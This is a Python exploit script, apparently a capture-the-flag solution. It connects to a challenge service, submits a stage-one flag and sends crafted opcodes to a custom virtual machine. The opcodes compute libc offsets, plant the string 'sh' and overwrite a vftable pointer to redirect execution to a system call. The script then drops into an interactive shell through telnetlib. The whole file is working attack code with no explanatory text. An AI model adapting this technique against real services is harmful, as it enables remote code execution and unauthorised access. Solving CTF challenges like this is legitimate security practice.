import struct
import socket
import telnetlib

stage1_flag = 'H3X0R{TH15_15_5T4G3_0N3}'

u32 = lambda x: struct.unpack("<L", x)[0]

remote = True

if remote:
	HOST, PORT = '0.0.0.0', 10004
	r = socket.create_connection((HOST, PORT))
	r.send(stage1_flag + '\n')

else:
	r = open('.j', 'wb')

def pop(a):
	return 19, 0, a, 0

def movr(a, b):
	return 0, 0, a, b

def subi(a, b):
	return 5, 3, a, b

def movi(a, b):
	return 0, 3, a, b

def addr(a, b):
	return 4, 0, a, b

def movmr(a, b):
	return 0, 32, a, b

def movcopy(a, b):
	return 0, 34, a, b

def movmi(a, b):
	return 0, 36, a, b

def addi(a, b):
	return 4, 3, a, b

def movrm(a, b):
	return 0, 2, a, b

def process(opcodes):
	payload = ''
	for opcode in opcodes:
		payload += struct.pack("<HHLL", *opcode)
	if not remote:
		r.write(payload + '\n')
	else:
		r.send(payload + '\n')

opcodes = [
pop(0), # ss
pop(1), # ds
pop(2), # cs

movr(3, 1),
subi(2, 0x1be000), # libc
movr(6, 2),
addi(6, 0x1b0d60),
movmi(6, u32('sh\x00\x00')),
movi(5, 148), # vftable
addr(6, 5),
movrm(4, 6)
]

for i in range(0, 0, 4):
	opcodes += [
	movcopy(3, 4),
	addi(4, 4),
	addi(3, 4)
	]

opcodes += [
movr(3, 1),
addi(3, 0x1c),
movr(7, 2),
addi(7, 0x3a940),
movmr(3, 7),
movmr(6, 1)
]

process(opcodes)
if remote:
	t = telnetlib.Telnet()
	t.sock = r
	t.interact()